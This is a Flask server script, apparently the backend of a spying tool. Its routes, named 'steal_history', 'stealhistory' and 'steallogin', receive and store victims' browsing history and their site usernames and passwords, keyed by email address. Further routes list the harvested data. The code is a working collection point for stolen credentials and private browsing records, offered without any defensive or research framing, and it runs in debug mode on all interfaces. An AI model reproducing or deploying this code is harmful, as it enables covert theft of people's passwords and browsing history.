
from flask import Flask, render_template, request, session, redirect, url_for
import history, login

app = Flask(__name__)

@app.route("/")
def hello():
    return "Hello World!"

@app.route("/steal_history", methods=['POST'])
def steal_history():
    email = request.form['email']
    # hist = request.form['doo_history']
    f = request.form
    urls = request.form.getlist('urls[]')
    last_visited = request.form.getlist('last_visits[]')
    history.bulk_add_to_history(email, urls, last_visited)
    return "hi"

@app.route("/stealhistory", methods=['POST', 'GET'])
def stealhistory():
    if request.method == 'POST':
        email = request.form['email']
        url = request.form['url']
        time = request.form['last_visited']
        history.addToHistory(email, url, time)
        return "\n\n\nWe added to history: " + email
    elif request.method == 'GET':
        data = history.getHistory()
        return render_template('history.html', data = data)

@app.route("/view_user/<email>", methods=['GET'])
def view_user(email):
    hist = history.get_history_by_user(email)
    return render_template('user.html', email = email, history = hist)

@app.route("/steallogin", methods=['POST'])
def steallogin():
    if request.method == 'POST':
        email = request.form['email']
        url = request.form['url']
        username = request.form['username']
        password = request.form['password']
        login.addToLogin(email, url, username, password)
        return "we all good here"

if __name__ == "__main__":
    app.debug = True
    app.run(host='0.0.0.0', port=5000, threaded=True)
